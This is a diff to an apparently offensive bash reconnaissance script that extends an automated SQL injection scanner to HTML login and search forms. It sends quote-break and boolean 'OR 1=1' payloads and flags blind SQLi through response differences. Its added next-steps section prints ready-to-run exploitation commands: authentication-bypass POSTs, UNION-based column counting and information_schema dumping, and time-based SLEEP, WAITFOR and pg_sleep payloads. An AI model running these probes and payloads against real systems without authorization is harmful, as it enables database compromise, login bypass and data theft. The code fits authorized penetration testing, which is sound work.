@@ -1385,13 +1385,17 @@ phase_sqli_probe() {
         base_origin="${base_origin}:${base_port}"
     fi
 
-    # Collect candidate (URL, param_name) pairs from any source that produced
-    # URLs with query strings. No query string = nothing to probe.
+    # Collect probe records from 5 sources. Each record is fully preassembled
+    # so the bash loop just issues the request — no per-iteration python calls.
+    # Record format (tab-separated):
+    #   TYPE    PNAME    BASE_URL    PROBE_URL    BODY
+    # where TYPE ∈ {GET_PARAM, FORM_GET, FORM_POST}. BODY is empty for GETs.
     local pairs_tmp
     pairs_tmp=$(mktemp) || return 1
     python3 - "$work_dir" "$base_origin" > "$pairs_tmp" <<'PY'
-import glob, json, os, sys
-from urllib.parse import urlparse, parse_qsl, urlunparse, urlencode
+import glob, json, os, ssl, sys, urllib.request
+from html.parser import HTMLParser
+from urllib.parse import urlparse, parse_qsl, urlunparse, urlencode, urljoin
 
 work_dir = sys.argv[1]
 origin = sys.argv[2].rstrip("/")
@@ -1411,7 +1415,7 @@ def abs_url(u):
 seen = set()
 out = []
 
-def add(u):
+def emit_get_param(u):
     if not u:
         return
     try:
@@ -1423,16 +1427,23 @@ def add(u):
     qs = parse_qsl(p.query, keep_blank_values=True)
     if not qs:
         return
-    for name, _ in qs:
+    for name, orig_val in qs:
         if not name:
             continue
-        key = (p.scheme, p.netloc, p.path, name)
+        key = (p.scheme, p.netloc, p.path, name, "GET_PARAM")
         if key in seen:
             continue
         seen.add(key)
-        # Normalized URL without fragments
-        norm = urlunparse((p.scheme, p.netloc, p.path, "", p.query, ""))
-        out.append(f"{name}\t{norm}")
+        base = urlunparse((p.scheme, p.netloc, p.path, "", p.query, ""))
+        mutated = [(k, ("1'" if k == name else v)) for k, v in qs]
+        probe = urlunparse((p.scheme, p.netloc, p.path, "", urlencode(mutated), ""))
+        # Encode the original value so the differential check can restore it
+        # as a "known-good" baseline — critical for params like view=console
+        # where any other string is itself an error path.
+        orig_enc = urlencode([(name, orig_val)]).split("=", 1)[1]
+        # "-" placeholder for post_body: bash's read with IFS=\t collapses
+        # adjacent tabs (tab is whitespace), so empty fields must be filled.
+        out.append(f"GET_PARAM\t{name}\t{base}\t{probe}\t-\t{orig_enc}")
 
 # Source 1: phase_params ffuf JSON (deep mode)
 for jf in sorted(glob.glob(os.path.join(work_dir, "params", "params_*.json"))):
@@ -1442,7 +1453,7 @@ for jf in sorted(glob.glob(os.path.join(work_dir, "params", "params_*.json"))):
         continue
     for r in data.get("results", []) or []:
         if r.get("status") == 200:
-            add(r.get("url", ""))
+            emit_get_param(r.get("url", ""))
 
 # Source 2: content-phase ffuf JSON — any result URL with a '?'
 for jf in glob.glob(os.path.join(work_dir, "content", "*.json")):
@@ -1453,7 +1464,7 @@ for jf in glob.glob(os.path.join(work_dir, "content", "*.json")):
     for r in data.get("results", []) or []:
         u = r.get("url", "")
         if "?" in u and r.get("status", 0) in (200, 301, 302, 401, 403):
-            add(u)
+            emit_get_param(u)
 
 # Source 3: JS endpoint extraction from fingerprint phase
 js_file = os.path.join(work_dir, "fingerprint", "js_endpoints.txt")
@@ -1462,9 +1473,9 @@ if os.path.exists(js_file):
         line = line.strip()
         if "?" not in line:
             continue
-        add(abs_url(line))
+        emit_get_param(abs_url(line))
 
-# Source 4: robots.txt Disallow entries
+# Source 4: robots.txt Disallow entries with '?'
 robots_file = os.path.join(work_dir, "fingerprint", "robots.txt")
 if os.path.exists(robots_file):
     for line in open(robots_file, errors="ignore"):
@@ -1473,7 +1484,128 @@ if os.path.exists(robots_file):
             continue
         path = line.split(":", 1)[1].strip()
         if "?" in path:
-            add(abs_url(path))
+            emit_get_param(abs_url(path))
+
+# Source 5: <form> tags from root + content-phase 200 HTML pages.
+# Catches POST login forms (username/password SQLi) and GET forms whose query
+# strings are only materialized after submission — invisible to sources 1-4.
+class FormParser(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.forms = []
+        self._current = None
+    def handle_starttag(self, tag, attrs):
+        a = dict(attrs)
+        if tag == "form":
+            self._current = {
+                "action": a.get("action", ""),
+                "method": (a.get("method", "get") or "get").lower(),
+                "inputs": [],
+            }
+        elif tag in ("input", "textarea", "select") and self._current is not None:
+            name = a.get("name")
+            if not name:
+                return
+            itype = (a.get("type") or "text").lower()
+            if itype in ("submit", "button", "image", "reset", "file"):
+                return
+            self._current["inputs"].append({
+                "name": name,
+                "type": itype,
+                "value": a.get("value", "") or "",
+            })
+    def handle_endtag(self, tag):
+        if tag == "form" and self._current is not None:
+            if self._current["inputs"]:
+                self.forms.append(self._current)
+            self._current = None
+
+def default_for(inp):
+    if inp["value"]:
+        return inp["value"]
+    nm = inp["name"].lower()
+    if "mail" in nm:
+        return "test@test.com"
+    if "pass" in nm:
+        return "Passw0rd!"
+    if inp["type"] == "number" or nm in ("id", "uid", "pid"):
+        return "1"
+    return "test"
+
+pages = [origin + "/"]
+for jf in sorted(glob.glob(os.path.join(work_dir, "content", "*.json"))):
+    try:
+        data = json.load(open(jf))
+    except Exception:
+        continue
+    for r in data.get("results", []) or []:
+        u = r.get("url", "")
+        st = r.get("status", 0)
+        if not u.startswith(origin) or "?" in u:
+            continue
+        if st == 200:
+            pages.append(u)
+        elif st in (301, 302):
+            # Directory redirect — follow to trailing-slash form (e.g. /zm → /zm/).
+            # Apps like ZoneMinder live under these subdirs and host the real forms.
+            pages.append(u.rstrip("/") + "/")
+
+dedup = []
+for p in pages:
+    if p not in dedup:
+        dedup.append(p)
+pages = dedup[:10]  # cap fetches
+
+ctx = ssl._create_unverified_context()
+hdrs = {"User-Agent": "Mozilla/5.0"}
+forms_seen = 0
+
+for page in pages:
+    try:
+        req = urllib.request.Request(page, headers=hdrs)
+        body = urllib.request.urlopen(req, timeout=5, context=ctx).read().decode("utf-8", errors="ignore")
+    except Exception:
+        continue
+    fp = FormParser()
+    try:
+        fp.feed(body)
+    except Exception:
+        continue
+    for form in fp.forms:
+        action = form["action"].strip() or page
+        action_url = urljoin(page, action)
+        method = form["method"] if form["method"] in ("get", "post") else "get"
+        names = [i["name"] for i in form["inputs"]]
+        if not names:
+            continue
+        forms_seen += 1
+        defaults = {i["name"]: default_for(i) for i in form["inputs"]}
+        ap = urlparse(action_url)
+        if method == "get":
+            # Build a synthetic URL with all fields as defaults. Hidden fields
+            # end up in the URL on submission anyway, so treat them as mutable
+            # targets. Route through emit_get_param so each param becomes one
+            # GET_PARAM probe record — catches ZoneMinder-style ?view=console.
+            if defaults:
+                synth = urlunparse((ap.scheme, ap.netloc, ap.path, "", urlencode(defaults), ""))
+                emit_get_param(synth)
+        else:
+            # POST — skip hidden fields (CSRF / nonce / state) to avoid breaking
+            # anti-forgery tokens that would reject the request before reaching SQL.
+            for inp in form["inputs"]:
+                if inp["type"] == "hidden":
+                    continue
+                vals = dict(defaults)
+                vals[inp["name"]] = "1'"
+                body_enc = urlencode(vals)
+                key = ("post", ap.netloc, ap.path, inp["name"], "FORM")
+                if key in seen:
+                    continue
+                seen.add(key)
+                # Also emit the field's original default so the differential
+                # baseline uses a non-error value (e.g. "admin" not "zxq9nope").
+                orig_enc = urlencode([(inp["name"], defaults[inp["name"]])]).split("=", 1)[1]
+                out.append(f"FORM_POST\t{inp['name']}\t{action_url}\t{action_url}\t{body_enc}\t{orig_enc}")
 
 for row in out:
     print(row)
@@ -1482,7 +1614,7 @@ PY
     local total
     total=$(wc -l < "$pairs_tmp" 2>/dev/null); total=${total:-0}
     if (( total == 0 )); then
-        info "No URLs with query params to probe — skipping SQLi probe"
+        info "No URLs or forms to probe — skipping SQLi probe"
         rm -f "$pairs_tmp"
         return 0
     fi
@@ -1494,14 +1626,14 @@ PY
     local -a ssl_flag=()
     [[ "$base_proto" == "https" ]] && ssl_flag=(-k)
 
-    # Cap to keep runtime bounded (~1 request per pair, max ~25 requests).
-    local cap=25
+    # Cap to keep runtime bounded (~1 request per record, max ~30 requests).
+    local cap=30
     if (( total > cap )); then
-        info "Capping SQLi probe at $cap of $total (URL,param) pair(s)"
+        info "Capping SQLi probe at $cap of $total probe record(s)"
         head -n "$cap" "$pairs_tmp" > "${pairs_tmp}.capped" && mv "${pairs_tmp}.capped" "$pairs_tmp"
         total=$cap
     else
-        info "Probing $total (URL,param) pair(s) for SQL error signatures"
+        info "Probing $total record(s) for SQL error signatures (GET params + HTML forms)"
     fi
 
     local suspects="$outdir/suspects.txt"
@@ -1515,28 +1647,25 @@ PY
     local body_tmp
     body_tmp=$(mktemp) || { rm -f "$pairs_tmp"; return 1; }
 
-    # Build probe URL: replace the target param's value with "1'" (URL-encoded).
-    # Keeps other params intact. Delegates to Python for correct query parsing.
-    while IFS=$'\t' read -r pname base_url; do
-        [[ -z "$pname" || -z "$base_url" ]] && continue
-        local probe_url
-        probe_url=$(python3 - "$base_url" "$pname" <<'PY'
-import sys
-from urllib.parse import urlparse, parse_qsl, urlunparse, urlencode
-base, pname = sys.argv[1], sys.argv[2]
-p = urlparse(base)
-qs = parse_qsl(p.query, keep_blank_values=True)
-new = [(k, ("1'" if k == pname else v)) for k, v in qs]
-print(urlunparse((p.scheme, p.netloc, p.path, "", urlencode(new), "")))
-PY
-        )
-        [[ -z "$probe_url" ]] && continue
+    # Process preassembled records. GETs get the probe URL directly; POSTs get
+    # the body as -d, action URL as target. No per-iteration python.
+    while IFS=$'\t' read -r rec_type pname base_url probe_url post_body orig_enc; do
+        [[ -z "$rec_type" || -z "$pname" || -z "$probe_url" ]] && continue
+        # "-" placeholder comes back from the Python collector for absent fields
+        # (tab is whitespace to read, so empty fields get collapsed otherwise).
+        [[ "$post_body" == "-" ]] && post_body=""
         (( probed++ ))
 
         local http_code
-        http_code=$(timeout "$CURL_TIMEOUT" curl -sk -o "$body_tmp" -w '%{http_code}' \
-            -A 'Mozilla/5.0' --max-time "$CURL_TIMEOUT" "${ssl_flag[@]}" \
-            "$probe_url" 2>/dev/null || echo "")
+        if [[ "$rec_type" == "FORM_POST" ]]; then
+            http_code=$(timeout "$CURL_TIMEOUT" curl -sk -o "$body_tmp" -w '%{http_code}' \
+                -A 'Mozilla/5.0' --max-time "$CURL_TIMEOUT" "${ssl_flag[@]}" \
+                -X POST --data "$post_body" "$probe_url" 2>/dev/null || echo "")
+        else
+            http_code=$(timeout "$CURL_TIMEOUT" curl -sk -o "$body_tmp" -w '%{http_code}' \
+                -A 'Mozilla/5.0' --max-time "$CURL_TIMEOUT" "${ssl_flag[@]}" \
+                "$probe_url" 2>/dev/null || echo "")
+        fi
 
         [[ -s "$body_tmp" ]] || continue
 
@@ -1556,15 +1685,116 @@ PY
             (( flagged++ ))
             {
                 echo "# --- Suspect $flagged ---"
+                echo "Type:    $rec_type"
                 echo "URL:     $base_url"
                 echo "Param:   $pname"
                 echo "Probe:   $probe_url"
+                [[ "$rec_type" == "FORM_POST" ]] && echo "Body:    $post_body"
                 echo "Status:  $http_code"
                 echo "DBMS:    $dbms"
                 echo "Markers: $matched"
                 echo ""
             } >> "$suspects"
-            info "  [!] SQLi-error signature on $base_url (param=$pname, $dbms)"
+            info "  [!] SQLi-error signature on $base_url (param=$pname, type=$rec_type, $dbms)"
+            continue
+        fi
+
+        # Differential (boolean) check — runs when error-based probe came up
+        # empty. Catches apps that wrap queries in try/catch (silent errors) or
+        # that are vulnerable to boolean-based blind SQLi. Compares three
+        # responses: benign, OR-true, OR-false. Divergence between true and
+        # false indicates the input reaches the query logic.
+        if [[ "$rec_type" == "FORM_POST" || "$rec_type" == "GET_PARAM" || "$rec_type" == "FORM_GET" ]]; then
+            # Benign baseline uses the original default value for this param
+            # (passed through from Python). Falls back to a junk string if no
+            # default is known — but with a default, we test against the real
+            # non-error path, which is what enables size-diff detection.
+            local benign_payload="${orig_enc:-zxq9nope}"
+            local true_payload="admin%27%20OR%20%271%27%3D%271--%20-"
+            local false_payload="admin%27%20OR%20%271%27%3D%272--%20-"
+
+            local -a benign_args=() true_args=() false_args=()
+            if [[ "$rec_type" == "FORM_POST" ]]; then
+                local benign_body true_body false_body
+                benign_body="${post_body/${pname}=1%27/${pname}=${benign_payload}}"
+                true_body="${post_body/${pname}=1%27/${pname}=${true_payload}}"
+                false_body="${post_body/${pname}=1%27/${pname}=${false_payload}}"
+                benign_args=(-X POST --data "$benign_body" "$probe_url")
+                true_args=(-X POST --data "$true_body" "$probe_url")
+                false_args=(-X POST --data "$false_body" "$probe_url")
+            else
+                # GET: mutate the probe URL directly.
+                local benign_url true_url false_url
+                benign_url="${probe_url/${pname}=1%27/${pname}=${benign_payload}}"
+                true_url="${probe_url/${pname}=1%27/${pname}=${true_payload}}"
+                false_url="${probe_url/${pname}=1%27/${pname}=${false_payload}}"
+                benign_args=("$benign_url")
+                true_args=("$true_url")
+                false_args=("$false_url")
+            fi
+
+            local bt=$(mktemp) tt=$(mktemp) ft=$(mktemp)
+            local bm tm fm
+            bm=$(timeout "$CURL_TIMEOUT" curl -sk -o "$bt" -w '%{http_code}|%{size_download}|%{redirect_url}' \
+                -A 'Mozilla/5.0' --max-time "$CURL_TIMEOUT" "${ssl_flag[@]}" \
+                "${benign_args[@]}" 2>/dev/null || echo "")
+            tm=$(timeout "$CURL_TIMEOUT" curl -sk -o "$tt" -w '%{http_code}|%{size_download}|%{redirect_url}' \
+                -A 'Mozilla/5.0' --max-time "$CURL_TIMEOUT" "${ssl_flag[@]}" \
+                "${true_args[@]}" 2>/dev/null || echo "")
+            fm=$(timeout "$CURL_TIMEOUT" curl -sk -o "$ft" -w '%{http_code}|%{size_download}|%{redirect_url}' \
+                -A 'Mozilla/5.0' --max-time "$CURL_TIMEOUT" "${ssl_flag[@]}" \
+                "${false_args[@]}" 2>/dev/null || echo "")
+
+            local b_code b_size b_loc t_code t_size t_loc f_code f_size f_loc
+            IFS='|' read -r b_code b_size b_loc <<< "$bm"
+            IFS='|' read -r t_code t_size t_loc <<< "$tm"
+            IFS='|' read -r f_code f_size f_loc <<< "$fm"
+            b_size=${b_size:-0}; t_size=${t_size:-0}; f_size=${f_size:-0}
+
+            local diverged=false reason=""
+            if [[ -n "$t_code" && -n "$f_code" && "$t_code" != "$f_code" ]]; then
+                diverged=true; reason="status $t_code (true) vs $f_code (false)"
+            elif [[ -n "$t_loc" && -z "$f_loc" ]]; then
+                diverged=true; reason="redirect only on OR-true ($t_loc)"
+            elif [[ -z "$t_loc" && -n "$f_loc" ]]; then
+                diverged=true; reason="redirect only on OR-false ($f_loc)"
+            else
+                local sz_delta=$(( t_size > f_size ? t_size - f_size : f_size - t_size ))
+                local sz_ref=$(( f_size > 0 ? f_size : 1 ))
+                if (( sz_delta * 100 / sz_ref >= 15 && sz_delta >= 40 )); then
+                    diverged=true; reason="body size ${t_size} (true) vs ${f_size} (false) — Δ${sz_delta}b"
+                fi
+            fi
+
+            # Also flag when the original 1'-probe already diverges from benign
+            # baseline. Catches apps that silently return a stub response on
+            # query errors (e.g. ZoneMinder's 24-byte "empty result" on syntax).
+            if [[ "$diverged" != "true" ]]; then
+                local probe_size=$(wc -c < "$body_tmp" 2>/dev/null); probe_size=${probe_size:-0}
+                local base_delta=$(( b_size > probe_size ? b_size - probe_size : probe_size - b_size ))
+                local base_ref=$(( b_size > 0 ? b_size : 1 ))
+                if (( base_delta * 100 / base_ref >= 50 && base_delta >= 100 )); then
+                    diverged=true; reason="quote-break size ${probe_size}b vs benign ${b_size}b — Δ${base_delta}b"
+                fi
+            fi
+            rm -f "$bt" "$tt" "$ft"
+
+            if [[ "$diverged" == "true" ]]; then
+                (( flagged++ ))
+                {
+                    echo "# --- Suspect $flagged ---"
+                    echo "Type:    ${rec_type}_BOOL"
+                    echo "URL:     $base_url"
+                    echo "Param:   $pname"
+                    echo "Probe:   $probe_url"
+                    [[ "$rec_type" == "FORM_POST" ]] && echo "Body:    $true_body   # OR-true payload"
+                    echo "Status:  true=$t_code false=$f_code benign=$b_code"
+                    echo "DBMS:    unknown (blind)"
+                    echo "Markers: boolean-differential: $reason"
+                    echo ""
+                } >> "$suspects"
+                info "  [!] Boolean SQLi divergence on $base_url (param=$pname, $reason)"
+            fi
         fi
     done < "$pairs_tmp"
 
@@ -2280,30 +2510,51 @@ generate_next_steps() {
         local suspect_count
         suspect_count=$(grep -c '^URL:' "$sqli_suspects" 2>/dev/null); suspect_count=${suspect_count:-0}
         if (( suspect_count > 0 )); then
-            local first_probe
+            local first_type first_probe first_param first_body
+            first_type=$(grep -m1 '^Type:' "$sqli_suspects" | awk '{print $2}')
             first_probe=$(grep -m1 '^Probe:' "$sqli_suspects" | awk '{print $2}')
-            local first_param
             first_param=$(grep -m1 '^Param:' "$sqli_suspects" | awk '{print $2}')
+            first_body=$(grep -m1 '^Body:' "$sqli_suspects" | sed 's/^Body:[[:space:]]*//')
+
+            local -a sqli_cmds=()
+            sqli_cmds+=("cat $sqli_suspects")
+            if [[ "$first_type" == "FORM_POST" ]]; then
+                sqli_cmds+=("# --- Manual POST-form SQLi workflow ---")
+                sqli_cmds+=("# Flagged POST form — param=$first_param action=$first_probe")
+                sqli_cmds+=("# Baseline (quote-break already confirmed in suspects.txt):")
+                sqli_cmds+=("curl -sk -X POST --data \"$first_body\" '$first_probe' | head -60")
+                sqli_cmds+=("# Auth-bypass style (replace $first_param value with each payload):")
+                sqli_cmds+=("curl -sk -X POST --data \"${first_param}=admin'--+&$(echo "$first_body" | sed "s/${first_param}=[^&]*&\\?//")\" '$first_probe' -i | head -20")
+                sqli_cmds+=("curl -sk -X POST --data \"${first_param}=' OR 1=1-- -&$(echo "$first_body" | sed "s/${first_param}=[^&]*&\\?//")\" '$first_probe' -i | head -20")
+                sqli_cmds+=("# UNION — determine column count (watch error → success transition):")
+                sqli_cmds+=("for n in 1 2 3 4 5 6 7 8; do echo \"-- cols=\$n --\"; curl -sk -X POST --data \"${first_param}=1' ORDER BY \$n-- -&$(echo "$first_body" | sed "s/${first_param}=[^&]*&\\?//")\" '$first_probe' | grep -iE 'error|warning' | head -1; done")
+                sqli_cmds+=("# Time-based blind (pick per DBMS from suspects.txt Markers line):")
+                sqli_cmds+=("time curl -sk -X POST --data \"${first_param}=1' AND SLEEP(5)-- -&$(echo "$first_body" | sed "s/${first_param}=[^&]*&\\?//")\" '$first_probe'")
+                sqli_cmds+=("# --- Burp Community Intruder (recommended) ---")
+                sqli_cmds+=("# 1. Capture login POST; 2. Send to Intruder; 3. Mark \$${first_param}\$;")
+                sqli_cmds+=("# 4. Payloads = /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt + Auth_Bypass.txt")
+            else
+                sqli_cmds+=("# --- Manual UNION workflow in Burp Community Repeater ---")
+                sqli_cmds+=("# Starting probe URL (param=$first_param) — replace payload after the '1 in the query string:")
+                sqli_cmds+=("echo '$first_probe'")
+                sqli_cmds+=("# Step 1: find column count by incrementing N in ORDER BY until error:")
+                sqli_cmds+=("#   ...${first_param}=1' ORDER BY 1-- -")
+                sqli_cmds+=("#   ...${first_param}=1' ORDER BY 2-- -   (etc.)")
+                sqli_cmds+=("# Step 2: UNION-match the column count:")
+                sqli_cmds+=("#   ...${first_param}=1' UNION SELECT NULL,NULL,NULL-- -")
+                sqli_cmds+=("# Step 3: replace NULLs with user(),database(),version() then dump:")
+                sqli_cmds+=("#   ...${first_param}=1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -")
+                sqli_cmds+=("# --- Time-based blind (pick per DBMS from suspects.txt Markers line) ---")
+                sqli_cmds+=("# MySQL:       ${first_param}=1' AND SLEEP(5)-- -")
+                sqli_cmds+=("# MSSQL:       ${first_param}=1'; WAITFOR DELAY '0:0:5'-- -")
+                sqli_cmds+=("# PostgreSQL:  ${first_param}=1'; SELECT pg_sleep(5)-- -")
+                sqli_cmds+=("# --- Burp Community Intruder payload list (Sniper mode) ---")
+                sqli_cmds+=("# /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt")
+            fi
             append_next_finding "$next_file" \
                 "SQLi error signatures on ${suspect_count} param(s) — MANUAL only, no sqlmap" \
                 "phase_sqli_probe flagged DB error strings (see $sqli_suspects)" \
-                "cat $sqli_suspects" \
-                "# --- Manual UNION workflow in Burp Community Repeater ---" \
-                "# Starting probe URL (param=$first_param) — replace the payload after the '1 in the query string:" \
-                "echo '$first_probe'" \
-                "# Step 1: find column count by incrementing N in ORDER BY until error:" \
-                "#   ...${first_param}=1' ORDER BY 1-- -" \
-                "#   ...${first_param}=1' ORDER BY 2-- -   (etc.)" \
-                "# Step 2: UNION-match the column count:" \
-                "#   ...${first_param}=1' UNION SELECT NULL,NULL,NULL-- -" \
-                "# Step 3: replace NULLs with user(),database(),version() then dump:" \
-                "#   ...${first_param}=1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -" \
-                "# --- Time-based blind (pick per DBMS from suspects.txt Markers line) ---" \
-                "# MySQL:       ${first_param}=1' AND SLEEP(5)-- -" \
-                "# MSSQL:       ${first_param}=1'; WAITFOR DELAY '0:0:5'-- -" \
-                "# PostgreSQL:  ${first_param}=1'; SELECT pg_sleep(5)-- -" \
-                "# --- Burp Community Intruder payload list (Sniper mode) ---" \
-                "# /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt"
+                "${sqli_cmds[@]}"
         fi
     fi
 
